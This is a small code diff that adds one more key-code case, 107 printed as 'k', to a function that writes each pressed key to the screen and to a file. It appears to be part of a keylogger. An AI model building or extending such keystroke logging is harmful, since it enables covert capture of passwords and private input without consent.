@@ -29,6 +29,11 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" *F1* ");
 		break;
 
+	case 107:
+		std::cout << "k";
+		WriteToFile("k");
+		break;
+
 	case 48:
 		std::cout << "0";
 		WriteToFile("0");
